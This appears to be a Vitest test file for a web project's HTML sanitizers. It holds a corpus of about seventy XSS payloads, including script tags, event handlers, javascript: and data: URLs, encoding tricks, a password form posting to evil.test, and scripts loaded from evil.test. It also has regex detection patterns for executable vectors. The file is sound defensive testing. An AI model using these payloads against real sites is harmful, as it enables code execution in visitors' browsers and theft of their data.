import { describe, expect, it } from 'vitest'
import { escapeHtml, hasMarkup, sanitizeInlineHtml, sanitizeRichHtml, textToHtml } from '@/lib/html'

const SANITIZERS = [
  ['sanitizeInlineHtml', sanitizeInlineHtml],
  ['sanitizeRichHtml', sanitizeRichHtml],
] as const

/**
 * Anything that would make a browser run code or fetch a third party. Applied
 * to the output of BOTH sanitizers for every payload below.
 */
const EXECUTABLE_VECTORS: [string, RegExp][] = [
  ['a script tag', /<script/i],
  ['a style tag', /<style/i],
  ['an iframe', /<iframe/i],
  ['an object/embed', /<(object|embed|applet)/i],
  ['an svg or math container', /<(svg|math)\b/i],
  ['a form control', /<(form|input|button|textarea|select|option)\b/i],
  ['a meta or link tag', /<(meta|link|base)\b/i],
  ['an event handler attribute', /\son[a-z]+\s*=/i],
  ['a javascript: url', /javascript\s*:/i],
  ['a vbscript: url', /vbscript\s*:/i],
  ['a data: url', /data\s*:/i],
  ['an srcdoc or formaction attribute', /\s(srcdoc|formaction|xlink:href|href\s*=\s*["']?\s*j)/i],
  [
    'a style attribute that is not an allowed color or alignment',
    /style\s*=\s*"(?!(color:(#|var\(--site-)|text-align:))/i,
  ],
]

function expectInert(output: string, payload: string): void {
  for (const [name, pattern] of EXECUTABLE_VECTORS) {
    expect(pattern.test(output), `${name} survived\n  payload: ${payload}\n  output:  ${output}`).toBe(false)
  }
}

/** Every payload must come out inert from both sanitizers. */
const XSS_CORPUS = [
  '<script>alert(1)</script>',
  '<SCRIPT>alert(1)</SCRIPT>',
  '<script src="https://evil.test/x.js"></script>',
  '<script>document.cookie</script><b>ok</b>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<script>alert(1)',
  '<script\n>alert(1)</script\n>',
  '<script/src="https://evil.test/x.js"></script>',
  '<style>body{background:url(javascript:alert(1))}</style>',
  '<style>@import "https://evil.test/x.css";</style>',
  '<iframe src="https://evil.test"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<iframe src="javascript:alert(1)">',
  '<object data="https://evil.test/x.swf"></object>',
  '<embed src="https://evil.test/x.swf">',
  '<applet code="Evil.class"></applet>',
  '<svg onload="alert(1)"></svg>',
  '<svg><script>alert(1)</script></svg>',
  '<svg/onload=alert(1)>',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)">',
  '<img src=x onerror=alert(1)//>',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<img src="javascript:alert(1)">',
  '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">',
  '<img src="/ok.jpg" onload="alert(1)">',
  '<body onload=alert(1)>',
  '<div onmouseover="alert(1)">hover</div>',
  '<p onclick=alert(1)>click</p>',
  '<b ONMOUSEOVER="alert(1)">bold</b>',
  '<a href="javascript:alert(1)">link</a>',
  '<a href="JAVASCRIPT:alert(1)">link</a>',
  '<a href="  javascript:alert(1)">link</a>',
  '<a href="java\tscript:alert(1)">link</a>',
  '<a href="java\nscript:alert(1)">link</a>',
  '<a href="&#106;avascript:alert(1)">link</a>',
  '<a href="vbscript:msgbox(1)">link</a>',
  '<a href="data:text/html,<script>alert(1)</script>">link</a>',
  '<a href="//evil.test/phish">link</a>',
  '<a href="/ok" onclick="alert(1)">link</a>',
  '<a href="/ok" title="><script>alert(1)</script>">link</a>',
  '<a href=/ok onmouseover=alert(1)>link</a>',
  '<form action="https://evil.test"><input name="password"><button>Go</button></form>',
  '<input type="password" name="p">',
  '<textarea onfocus=alert(1) autofocus>',
  '<button formaction="javascript:alert(1)">Go</button>',
  '<meta http-equiv="refresh" content="0;url=https://evil.test">',
  '<link rel="stylesheet" href="https://evil.test/x.css">',
  '<base href="https://evil.test/">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><script>alert(1)</script></template>',
  '<!--<script>alert(1)</script>-->',
  '<!-- comment --><b>ok</b>',
  '<span style="background:url(javascript:alert(1))">x</span>',
  '<span style="color:red;behavior:url(#default#time2)">x</span>',
  '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</p>',
  '<div style="-moz-binding:url(https://evil.test/x.xml#xss)">x</div>',
  '<b>unclosed',
  '</b></p></div>',
  '<b><i>crossed</b></i>',
  '<<b>script>alert(1)<</b>/script>',
  '<b/onmouseover=alert(1)>bold</b>',
  '<a href="#ok" target="_self" rel="dofollow">anchor</a>',
  '< script>alert(1)</ script>',
  '<x-custom onclick=alert(1)>custom</x-custom>',
  '<plaintext>',
  '<xmp><script>alert(1)</script></xmp>',
  '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
  '<audio src=x onerror=alert(1)><source src=y onerror=alert(1)>',
  '<video><source onerror="alert(1)"></video>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<a href="https://ok.test/x?a=1&b=2">query</a>',
  'plain text with no markup at all',
  '',
]

describe.each(SANITIZERS)('%s against the XSS corpus', (_name, sanitize) => {
  it.each(XSS_CORPUS)('neutralises %j', (payload) => {
    expectInert(sanitize(payload), payload)
  })

  it('drops script, style and iframe content, not just the tags', () => {
    expect(sanitize('<script>alert(1)</script>')).toBe('')
    expect(sanitize('<style>.x{color:red}</style>')).toBe('')
    expect(sanitize('<iframe src="https://evil.test">fallback</iframe>')).toBe('')
    expect(sanitize('before<script>alert(1)</script>after')).toBe('beforeafter')
  })

  it('strips HTML comments', () => {
    expect(sanitize('a<!-- hidden -->b')).toBe('ab')
  })

  it('keeps the text of unknown tags', () => {
    expect(sanitize('<div>kept</div>')).toContain('kept')
    expect(sanitize('<x-custom>kept</x-custom>')).toContain('kept')
  })

  it('preserves entities', () => {
    expect(sanitize('Tom &amp; Jerry')).toBe('Tom &amp; Jerry')
    expect(sanitize('&lt;not a tag&gt;')).toBe('&lt;not a tag&gt;')
    expect(sanitize('&nbsp;&#39;&quot;')).toBe('&nbsp;&#39;&quot;')
  })

  it('neutralises a lone "<" that is not a tag', () => {
    expect(sanitize('5 < 7')).toBe('5 &lt; 7')
    expect(sanitize('a <3 b')).toBe('a &lt;3 b')
  })

  it('keeps allowed inline marks', () => {
    expect(sanitize('<b>b</b><strong>s</strong><i>i</i><em>e</em><u>u</u>')).toBe(
      '<b>b</b><strong>s</strong><i>i</i><em>e</em><u>u</u>',
    )
    expect(sanitize('<mark>highlight</mark>')).toBe('<mark>highlight</mark>')
    expect(sanitize('line<br>break')).toBe('line<br>break')
    expect(sanitize('x<sub>1</sub><sup>2</sup><code>c</code><s>s</s>')).toBe(
      'x<sub>1</sub><sup>2</sup><code>c</code><s>s</s>',
    )
  })

  it('keeps safe links and adds rel/target for external ones', () => {
    expect(sanitize('<a href="/about">About</a>')).toBe('<a href="/about">About</a>')
    expect(sanitize('<a href="#contact">Contact</a>')).toBe('<a href="#contact">Contact</a>')
    expect(sanitize('<a href="mailto:layla@example.com">Mail</a>')).toBe(
      '<a href="mailto:layla@example.com">Mail</a>',
    )
    expect(sanitize('<a href="tel:+962791234567">Call</a>')).toBe('<a href="tel:+962791234567">Call</a>')

    const external = sanitize('<a href="https://ok.test/x">Out</a>')
    expect(external).toContain('href="https://ok.test/x"')
    expect(external).toContain('target="_blank"')
    expect(external).toContain('rel="noopener noreferrer"')
  })

  it('keeps an anchor without an href when the url is unsafe, and keeps its text', () => {
    const output = sanitize('<a href="javascript:alert(1)">text</a>')
    expect(output).toBe('<a>text</a>')
  })

  it('escapes quotes and angle brackets inside kept attribute values', () => {
    const output = sanitize('<a href="/a?x=1&y=2">q</a>')
    expect(output).toBe('<a href="/a?x=1&amp;y=2">q</a>')
  })

  it('limits span/mark style to the allowed colors', () => {
    expect(sanitize('<span style="color:#B9FF66">x</span>')).toBe('<span style="color:#B9FF66">x</span>')
    expect(sanitize('<span style="color:var(--site-primary)">x</span>')).toBe(
      '<span style="color:var(--site-primary)">x</span>',
    )
    expect(sanitize('<span style="color:red">x</span>')).toBe('<span>x</span>')
    expect(sanitize('<span style="color:var(--evil)">x</span>')).toBe('<span>x</span>')
    // Only the color declaration survives; everything else in `style` is dropped.
    expect(sanitize('<span style="color:#fff;display:none">x</span>')).toBe(
      '<span style="color:#fff">x</span>',
    )
    expect(sanitize('<span style="display:none;color:#fff">x</span>')).toBe(
      '<span style="color:#fff">x</span>',
    )
  })

  it('keeps only the allowed data-size values', () => {
    expect(sanitize('<span data-size="lg">x</span>')).toBe('<span data-size="lg">x</span>')
    expect(sanitize('<span data-size="huge">x</span>')).toBe('<span>x</span>')
    expect(sanitize('<span data-id="7">x</span>')).toBe('<span>x</span>')
  })
})

describe('sanitizeInlineHtml', () => {
  it('drops block elements but keeps their text', () => {
    expect(sanitizeInlineHtml('<p>one</p><p>two</p>')).toBe('onetwo')
    expect(sanitizeInlineHtml('<h2>Title</h2>')).toBe('Title')
    expect(sanitizeInlineHtml('<ul><li>a</li><li>b</li></ul>')).toBe('ab')
    expect(sanitizeInlineHtml('<blockquote>q</blockquote>')).toBe('q')
  })

  it('never keeps an image', () => {
    expect(sanitizeInlineHtml('<img src="/ok.jpg" alt="ok">')).toBe('')
    expect(sanitizeInlineHtml('<img src="https://res.cloudinary.com/demo/a.jpg">')).toBe('')
  })
})

describe('sanitizeRichHtml', () => {
  it('keeps block elements', () => {
    expect(sanitizeRichHtml('<p>one</p><p>two</p>')).toBe('<p>one</p><p>two</p>')
    expect(sanitizeRichHtml('<h2>A</h2><h3>B</h3><h4>C</h4>')).toBe('<h2>A</h2><h3>B</h3><h4>C</h4>')
    expect(sanitizeRichHtml('<ul><li>a</li></ul><ol><li>b</li></ol>')).toBe(
      '<ul><li>a</li></ul><ol><li>b</li></ol>',
    )
    expect(sanitizeRichHtml('<blockquote><p>q</p></blockquote>')).toBe('<blockquote><p>q</p></blockquote>')
    expect(sanitizeRichHtml('<pre><code>x</code></pre>')).toBe('<pre><code>x</code></pre>')
    expect(sanitizeRichHtml('<hr>')).toBe('<hr>')
    expect(sanitizeRichHtml('<figure><img src="/a.jpg"><figcaption>c</figcaption></figure>')).toContain(
      '<figcaption>c</figcaption>',
    )
  })

  it('drops h1 so the page keeps one top-level heading', () => {
    expect(sanitizeRichHtml('<h1>Title</h1>')).toBe('Title')
  })

  it('keeps an image only with a safe src, and always lazy', () => {
    const output = sanitizeRichHtml('<img src="/stock/desk.jpg" alt="A desk">')
    expect(output).toBe('<img src="/stock/desk.jpg" alt="A desk" loading="lazy" decoding="async">')
  })

  it('gives an image an empty alt when none was provided', () => {
    expect(sanitizeRichHtml('<img src="/a.jpg">')).toContain('alt=""')
  })

  it('drops an image whose src is unsafe or not an http(s)/relative URL', () => {
    for (const src of [
      'javascript:alert(1)',
      'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=',
      'mailto:layla@example.com',
      'tel:+962791234567',
      'vbscript:msgbox(1)',
      '',
    ]) {
      expect(sanitizeRichHtml(`<img src="${src}" alt="x">`), src).toBe('')
    }
  })

  it('escapes a quote smuggled into alt so it cannot start a new attribute', () => {
    const output = sanitizeRichHtml('<img src="/a.jpg" alt=\'" onerror="alert(1)\'>')
    expect(output).toBe(
      '<img src="/a.jpg" alt="&quot; onerror=&quot;alert(1)" loading="lazy" decoding="async">',
    )
    // The payload survives only as escaped text inside alt — no raw quote closes it.
    expect(output).not.toMatch(/alt="[^"]*"[^>]*onerror/)
  })

  it('limits text-align on blocks to the allowed values', () => {
    expect(sanitizeRichHtml('<p style="text-align:center">x</p>')).toBe('<p style="text-align:center">x</p>')
    expect(sanitizeRichHtml('<h2 style="text-align:end">x</h2>')).toBe('<h2 style="text-align:end">x</h2>')
    expect(sanitizeRichHtml('<p style="text-align:inherit">x</p>')).toBe('<p>x</p>')
    expect(sanitizeRichHtml('<p style="text-align:center;position:fixed">x</p>')).toBe(
      '<p style="text-align:center">x</p>',
    )
  })

  it('keeps a numeric start on an ordered list only', () => {
    expect(sanitizeRichHtml('<ol start="3"><li>c</li></ol>')).toBe('<ol start="3"><li>c</li></ol>')
    expect(sanitizeRichHtml('<ol start="x"><li>c</li></ol>')).toBe('<ol><li>c</li></ol>')
  })
})

describe('hasMarkup', () => {
  it('is true only when HTML rendering is needed', () => {
    expect(hasMarkup('<b>x</b>')).toBe(true)
    expect(hasMarkup('Tom &amp; Jerry')).toBe(true)
    expect(hasMarkup('plain text')).toBe(false)
    expect(hasMarkup('ليلى حداد')).toBe(false)
  })
})

describe('escapeHtml', () => {
  it('escapes every HTML-significant character', () => {
    expect(escapeHtml('<a href="x">&\'</a>')).toBe('&lt;a href=&quot;x&quot;&gt;&amp;&#39;&lt;/a&gt;')
  })

  it('escapes & first so entities are not double-decoded', () => {
    expect(escapeHtml('&lt;')).toBe('&amp;lt;')
  })
})

describe('textToHtml', () => {
  it('turns blank-line-separated text into paragraphs', () => {
    expect(textToHtml('One\n\nTwo')).toBe('<p>One</p><p>Two</p>')
  })

  it('turns single newlines into line breaks', () => {
    expect(textToHtml('One\nTwo')).toBe('<p>One<br>Two</p>')
  })

  it('escapes the text it wraps', () => {
    const output = textToHtml('<script>alert(1)</script>')
    expect(output).toBe('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>')
    expectInert(output, 'textToHtml')
  })

  it('drops empty paragraphs', () => {
    expect(textToHtml('\n\n\nOne\n\n\n\nTwo\n\n')).toBe('<p>One</p><p>Two</p>')
    expect(textToHtml('   ')).toBe('')
  })
})
